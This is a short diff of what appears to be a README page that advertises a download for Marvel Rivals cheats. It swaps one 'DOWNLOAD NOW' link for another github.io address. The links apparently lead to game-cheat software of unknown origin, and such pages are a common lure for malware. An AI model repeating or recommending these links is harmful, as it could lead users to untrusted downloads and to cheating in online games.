@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://marvel-rivals-cheat-li73.github.io/.github/ ) |
+&#x20; 📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://settlementcleamp.github.io/marvelx46f/) |
  |---------------------|----------------------:|
 
 
